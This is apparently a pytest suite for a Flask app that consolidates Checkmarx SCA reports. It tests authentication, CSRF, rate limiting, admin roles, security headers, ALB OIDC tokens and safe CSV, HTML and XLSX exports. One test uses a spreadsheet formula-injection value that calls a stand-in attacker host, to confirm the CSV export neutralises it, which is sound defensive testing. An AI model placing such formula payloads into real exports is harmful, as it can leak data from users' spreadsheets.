import io
import json
import os
import sqlite3
import time
import zipfile
from io import BytesIO

import jwt
import pytest
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ec

os.environ.setdefault("SECRET_KEY", "test-import-secret")

from checkmarx_sca_consolidator_v2 import BUILTIN_GROUP_RULES, build_xlsx_bytes, load_report, make_rows
from security import AlbOidcVerifier, AuthenticationError
from web_app import create_app


@pytest.fixture()
def app(tmp_path):
    return create_app(
        {
            "TESTING": True,
            "APP_ENV": "test",
            "AUTH_MODE": "local",
            "SECRET_KEY": "test-secret",
            "DATABASE": str(tmp_path / "users.db"),
            "REPORTS_PER_MINUTE": 100,
        }
    )


@pytest.fixture()
def client(app):
    return app.test_client()


def token(response):
    marker = b'name="csrf_token" value="'
    return response.data.split(marker, 1)[1].split(b'"', 1)[0].decode()


def create_admin(app):
    result = app.test_cli_runner().invoke(
        args=["create-admin"],
        input="reviewer\na-secure-password\na-secure-password\n",
    )
    assert result.exit_code == 0, result.output


def register_and_login(app, client):
    create_admin(app)
    response = client.get("/login")
    response = client.post(
        "/login",
        data={"csrf_token": token(response), "username": "reviewer", "password": "a-secure-password"},
    )
    assert response.status_code == 302


def sample_report(project_name="Demo"):
    return {
        "RiskReportSummary": {"ProjectName": project_name},
        "Packages": [
            {
                "Id": "npm-demo-1.0",
                "Name": "demo",
                "Version": "1.0",
                "IsDirectDependency": True,
                "VulnerabilityCount": 1,
                "HighVulnerabilityCount": 1,
                "Vulnerabilities": [{"CVE": "CVE-2026-1234", "CVSS": 8.1}],
            }
        ],
    }


def post_report(client, response, output_format, report=None):
    return client.post(
        "/report",
        data={
            "csrf_token": token(response),
            "format": output_format,
            "report": (io.BytesIO(json.dumps(report or sample_report()).encode()), "scan.json"),
        },
        content_type="multipart/form-data",
    )


def test_http_setup_is_removed_and_cli_provisioning_is_required(app, client):
    assert client.get("/setup").status_code == 404
    response = client.get("/login")
    assert response.status_code == 503
    assert b"create-admin" in response.data

    create_admin(app)
    assert client.get("/login").status_code == 200


def test_auth_and_ephemeral_preview(app, client, tmp_path):
    assert client.get("/").status_code == 302
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "preview")

    assert response.status_code == 200
    assert b"CVE-2026-1234" in response.data
    assert response.headers["Cache-Control"] == "no-store"
    assert not list(tmp_path.glob("*.json"))


def test_cli_password_recovery_forces_password_change(app, client):
    create_admin(app)
    reset = app.test_cli_runner().invoke(
        args=["reset-password"],
        input="reviewer\ntemporary-password-2026\ntemporary-password-2026\n",
    )
    assert reset.exit_code == 0, reset.output

    response = client.get("/login")
    response = client.post(
        "/login",
        data={
            "csrf_token": token(response),
            "username": "reviewer",
            "password": "temporary-password-2026",
        },
    )
    assert response.status_code == 302
    forced = client.get("/")
    assert forced.status_code == 302
    assert forced.headers["Location"].endswith("/change-password")

    page = client.get("/change-password")
    changed = client.post(
        "/change-password",
        data={
            "csrf_token": token(page),
            "current_password": "temporary-password-2026",
            "new_password": "replacement-password-2026",
            "confirm_password": "replacement-password-2026",
        },
    )
    assert changed.status_code == 302
    assert client.get("/").status_code == 200


def test_admin_panel_creates_regular_user_and_enforces_role(app, client):
    register_and_login(app, client)
    page = client.get("/admin")
    assert page.status_code == 200
    created = client.post(
        "/admin/users",
        data={
            "csrf_token": token(page),
            "username": "analyst",
            "password": "temporary-password-2026",
            "confirm_password": "temporary-password-2026",
        },
        follow_redirects=True,
    )
    assert created.status_code == 200
    assert b"Created analyst" in created.data

    analyst = app.test_client()
    response = analyst.get("/login")
    analyst.post(
        "/login",
        data={
            "csrf_token": token(response),
            "username": "analyst",
            "password": "temporary-password-2026",
        },
    )
    change_page = analyst.get("/change-password")
    analyst.post(
        "/change-password",
        data={
            "csrf_token": token(change_page),
            "current_password": "temporary-password-2026",
            "new_password": "analyst-password-2026",
            "confirm_password": "analyst-password-2026",
        },
    )
    assert analyst.get("/admin").status_code == 403


def test_admin_cannot_delete_own_account(app, client):
    register_and_login(app, client)
    page = client.get("/admin")
    response = client.post(
        "/admin/users/1/delete",
        data={"csrf_token": token(page)},
        follow_redirects=True,
    )
    assert b"cannot delete your own" in response.data
    with sqlite3.connect(app.config["DATABASE"]) as connection:
        assert connection.execute("SELECT count(*) FROM users").fetchone()[0] == 1


def test_workspace_ui_exposes_formats_and_strict_styles(app, client):
    register_and_login(app, client)
    response = client.get("/")

    assert response.status_code == 200
    for output_format in (b"preview", b"xlsx", b"csv", b"html"):
        assert b'name="format" value="' + output_format + b'"' in response.data
    assert b"Reports are not retained." in response.data
    assert b"/static/styles.css" in response.data
    csp = response.headers["Content-Security-Policy"]
    assert "style-src 'self'" in csp
    assert "object-src 'none'" in csp
    assert "'unsafe-inline'" not in csp


def test_csv_download_neutralizes_formula_injection(app, client):
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "csv", sample_report('=WEBSERVICE("https://attacker.invalid")'))

    assert response.status_code == 200
    assert response.mimetype == "text/csv"
    assert "attachment" in response.headers["Content-Disposition"]
    assert b"'=WEBSERVICE" in response.data


def test_html_download_is_sandboxed(app, client):
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "html")

    assert response.status_code == 200
    assert response.mimetype == "text/html"
    assert "attachment" in response.headers["Content-Disposition"]
    assert "sandbox" in response.headers["Content-Security-Policy"]
    assert b"Checkmarx SCA Consolidated Output" in response.data


def test_xlsx_download_contains_no_formula_cells(app, client):
    register_and_login(app, client)
    response = post_report(client, client.get("/"), "xlsx", sample_report("=1+1"))

    assert response.status_code == 200
    assert response.mimetype == "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
    with zipfile.ZipFile(BytesIO(response.data)) as workbook:
        worksheet_xml = b"".join(
            workbook.read(name)
            for name in workbook.namelist()
            if name.startswith("xl/worksheets/sheet")
        )
    assert b"<f" not in worksheet_xml


def test_string_vulnerability_counts_are_reportable():
    report = {
        "RiskReportSummary": {"ProjectName": "Demo"},
        "Packages": [
            {
                "Id": "npm-demo-1.0",
                "Name": "demo",
                "Version": "1.0",
                "IsDirectDependency": True,
                "VulnerabilityCount": "1",
                "HighVulnerabilityCount": "1",
            }
        ],
    }
    rows, _, diagnostics = make_rows(report, BUILTIN_GROUP_RULES)
    assert len(rows) == 1
    assert rows[0]["High Count"] == "1"
    assert diagnostics["packages_using_count_fallback"] == 1


def test_zip_json_member_size_is_capped(tmp_path):
    archive = tmp_path / "scan.zip"
    with zipfile.ZipFile(archive, "w") as zf:
        zf.writestr("SCA_ScanReport.json", json.dumps(sample_report()))

    with pytest.raises(SystemExit):
        load_report(archive, max_json_bytes=10)


def test_deeply_nested_json_is_rejected(tmp_path):
    report_path = tmp_path / "nested.json"
    report_path.write_text('{"nested":' * 80 + "{}" + "}" * 80, encoding="utf-8")
    with pytest.raises(ValueError, match="nesting depth"):
        load_report(report_path, max_depth=32)


def test_report_row_limit_is_enforced():
    report = sample_report()
    report["Packages"][0]["Locations"] = ["a", "b"]
    with pytest.raises(ValueError, match="row limit"):
        make_rows(report, BUILTIN_GROUP_RULES, max_rows=1)


def test_login_is_rate_limited_and_uses_uniform_password_check(app, client):
    create_admin(app)
    response = client.get("/login")
    csrf = token(response)
    for _ in range(5):
        response = client.post(
            "/login",
            data={"csrf_token": csrf, "username": "reviewer", "password": "wrong-password"},
        )
        assert response.status_code == 401
    response = client.post(
        "/login",
        data={"csrf_token": csrf, "username": "reviewer", "password": "wrong-password"},
    )
    assert response.status_code == 429
    assert response.headers["Retry-After"]


def test_alb_oidc_verifier_checks_signature_and_identity():
    private_key = ec.generate_private_key(ec.SECP256R1())
    public_key = private_key.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )
    alb_arn = "arn:aws:elasticloadbalancing:ap-south-1:123456789012:loadbalancer/app/reports/abc123"
    headers = {
        "kid": "test-key",
        "signer": alb_arn,
        "client": "client-123",
        "iss": "https://issuer.example",
        "exp": int(time.time()) + 300,
    }
    encoded = jwt.encode({"sub": "user-123", "email": "reviewer@example.com"}, private_key, algorithm="ES256", headers=headers)
    verifier = AlbOidcVerifier(
        alb_arn,
        "client-123",
        issuer="https://issuer.example",
        key_loader=lambda _region, _kid: public_key,
    )

    assert verifier.verify(encoded, "user-123")["email"] == "reviewer@example.com"
    with pytest.raises(AuthenticationError, match="signed subject"):
        verifier.verify(encoded, "another-user")


def test_production_alb_mode_requires_verified_headers(tmp_path):
    class FakeVerifier:
        def verify(self, token_value, identity):
            if token_value != "signed" or identity != "user-123":
                raise AuthenticationError("invalid")
            return {"sub": identity, "email": "reviewer@example.com"}

    app = create_app(
        {
            "TESTING": True,
            "APP_ENV": "production",
            "AUTH_MODE": "alb_oidc",
            "SECRET_KEY": "a" * 64,
            "SESSION_COOKIE_SECURE": True,
            "TRUSTED_HOSTS": ["reports.example.com"],
            "ALB_ARN": "arn:aws:elasticloadbalancing:ap-south-1:123456789012:loadbalancer/app/reports/abc123",
            "ALB_CLIENT_ID": "client-123",
            "ALB_ISSUER": "https://issuer.example",
            "ALB_LOGOUT_URL": "https://issuer.example/logout",
            "ALB_VERIFIER": FakeVerifier(),
            "DATABASE": str(tmp_path / "unused.db"),
        }
    )
    client = app.test_client()
    rejected = client.get("/", headers={"Host": "reports.example.com"})
    accepted = client.get(
        "/",
        headers={
            "Host": "reports.example.com",
            "X-Amzn-Oidc-Data": "signed",
            "X-Amzn-Oidc-Identity": "user-123",
        },
    )

    assert rejected.status_code == 401
    assert accepted.status_code == 200
    assert accepted.headers["Strict-Transport-Security"].startswith("max-age=31536000")


def test_production_requires_complete_alb_configuration():
    with pytest.raises(RuntimeError, match="ALB_ISSUER"):
        create_app(
            {
                "TESTING": True,
                "APP_ENV": "production",
                "AUTH_MODE": "alb_oidc",
                "SECRET_KEY": "a" * 64,
                "SESSION_COOKIE_SECURE": True,
                "TRUSTED_HOSTS": ["reports.example.com"],
                "ALB_ARN": "arn:aws:elasticloadbalancing:ap-south-1:123456789012:loadbalancer/app/reports/abc123",
                "ALB_CLIENT_ID": "client-123",
                "ALB_VERIFIER": object(),
            }
        )


def test_production_rejects_local_auth_and_weak_secrets(monkeypatch):
    monkeypatch.setenv("SECRET_KEY", "short")
    with pytest.raises(RuntimeError, match="at least 32 bytes"):
        create_app(
            {
                "APP_ENV": "production",
                "AUTH_MODE": "local",
                "SESSION_COOKIE_SECURE": True,
                "TRUSTED_HOSTS": ["reports.example.com"],
            }
        )

    monkeypatch.setenv("SECRET_KEY", "a" * 64)
    with pytest.raises(RuntimeError, match="AUTH_MODE=alb_oidc"):
        create_app(
            {
                "APP_ENV": "production",
                "AUTH_MODE": "local",
                "SESSION_COOKIE_SECURE": True,
                "TRUSTED_HOSTS": ["reports.example.com"],
            }
        )


def test_secret_key_is_required_for_non_test_startup(monkeypatch):
    monkeypatch.delenv("SECRET_KEY", raising=False)
    with pytest.raises(RuntimeError):
        create_app()
